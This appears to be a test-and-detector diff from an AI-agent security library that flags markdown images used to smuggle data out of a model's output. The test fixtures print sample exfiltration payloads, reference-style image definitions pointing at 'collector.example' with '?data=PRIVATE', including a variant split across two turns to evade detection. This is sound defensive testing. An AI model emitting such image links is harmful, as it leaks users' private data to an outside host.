@@ -30,11 +30,30 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     expect(flags(`![x][r]\n\n[r]:\n  https://c.example/p.png?secret=1`)).toBe(true);
   });
   it('reports every image that uses the definition, with its location', () => {
-    const text = `![a][r] and ![b][r]\n\n${DEF}`;
+    const text = `![a][r] and ![b][r] and some words ![c][r]\n\n${DEF}`;
     const threats = detector.scan(text).threats;
-    expect(threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length))).toEqual(['![a][r]', '![b][r]']);
+    expect(threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length))).toEqual(['![a][r]', '![b][r]', '![c][r]']);
     expect(threats[0].category).toBe('behavioural-control');
     expect(threats[0].type).toBe('data-exfiltration');
+  });
+  it('reports images that touch each other as one finding, so a run of tiny images is one marker', () => {
+    const text = `![a][r]![b][r] ![c][r]\n\n${DEF}`;
+    const threats = detector.scan(text).threats;
+    expect(threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length))).toEqual(['![a][r]![b][r] ![c][r]']);
+    const dense = '![r]'.repeat(1000) + `\n\n${DEF}`;
+    const result = AgentArmor.regexOnly().scanSync(dense);
+    expect(result.sanitized.length).toBeLessThan(400);
+  });
+  it('accepts a scheme-relative URL', () => {
+    expect(flags('![x][r]\n\n[r]: //c.example/p.png?data=1')).toBe(true);
+  });
+  it('the related span covers the destination, so a definition split across two turns is still caught', () => {
+    const armor = AgentArmor.regexOnly();
+    const sync = armor.scanSession([
+      { role: 'document' as const, content: 'Summary.\n\n![chart][r]\n\n[r]:' },
+      { role: 'document' as const, content: 'https://collector.example/p.png?data=PRIVATE' },
+    ]);
+    expect(sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
   });
 
   it('stays clean for honest references', () => {
@@ -104,7 +123,7 @@ function reference(content: string): Array<[number, number]> {
   const norm = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase();
   const flaggedUrl = (url: string): boolean => {
     let u = url.startsWith('<') ? url.slice(1) : url;
-    const m = /^https?:\/\//i.exec(u);
+    const m = /^(?:https?:)?\/\//i.exec(u);
     if (!m) return false;
     u = u.slice(m[0].length);
     let q = -1;
@@ -174,7 +193,11 @@ function reference(content: string): Array<[number, number]> {
     } else if (content[a + 1] === '(') { i++; continue; }
     if (label === undefined && alt.length <= 999) label = alt;
     const key = label === undefined ? '' : norm(label);
-    if (key !== '' && flagged.has(key)) out.push([i, end - i]);
+    if (key !== '' && flagged.has(key)) {
+      const last = out[out.length - 1];
+      if (last && i - (last[0] + last[1]) <= 100 && /^\s*$/.test(content.slice(last[0] + last[1], i))) last[1] = end - last[0];
+      else out.push([i, end - i]);
+    }
     i = end;
   }
   return out;
